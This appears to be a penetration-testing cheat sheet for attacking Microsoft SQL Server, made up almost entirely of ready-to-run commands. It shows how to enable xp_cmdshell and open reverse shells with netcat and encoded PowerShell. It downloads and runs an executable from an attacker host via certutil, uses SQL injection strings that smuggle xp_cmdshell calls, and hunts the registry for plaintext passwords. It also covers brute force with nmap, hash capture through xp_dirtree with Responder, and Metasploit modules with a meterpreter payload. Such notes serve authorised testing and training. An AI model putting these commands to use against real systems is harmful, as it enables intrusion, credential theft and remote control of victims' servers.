Connect to the DB:
sqsh -S 192.168.0.x -U username -P password
mssqlclient.py user:password@192.168.0.x -db mydb -port 27900
impacket-mssqlclient -windows-auth 'domain/web_svc@10.10.80.x'        

XP_cmdshell
Enabling xp_cmdshell feature
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

One Liner:
EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;

Since we have full control over the system, we can now easily upgrade our SQL shell to a more standard reverse shell.

Get a reverse shell:
xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd
' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.208/80.exe C:\Users\Public\80.exe'-- <-- Download an exe revshell. 
' EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'-- <-- Execute your revshell with powershell.

base64
powershell encoded base64 reverse shell
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY

netcat
xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd

Search for registry passwords from mssql
We search the registry hoping to find any plaintext passwords.
reg query HKLM /f pass /t REG_SZ /s

Nmap
nmap scripts
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip

Bruteforce
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip

MSSQL Server + Responder
UNC Path Injection
Uniform Naming Convention allows the sharing of resources on a network via a very precise syntax: \IP-Server\shareName\Folder\File
launch responder : responder -I eth0
EXEC master..xp_dirtree \"\\\\192.168.1.x\\\\evil\";
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--

[+] Attacking MSSQL with Metasploit
[>] Enumerate MSSQL Servers on the network:
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156

[>] Bruteforce MSSQL Database:
msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login

[>] Enumerate MSSQL Database:
msf > use auxiliary/admin/mssql/mssql_enum

[>] Gain shell using gathered credentials
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp



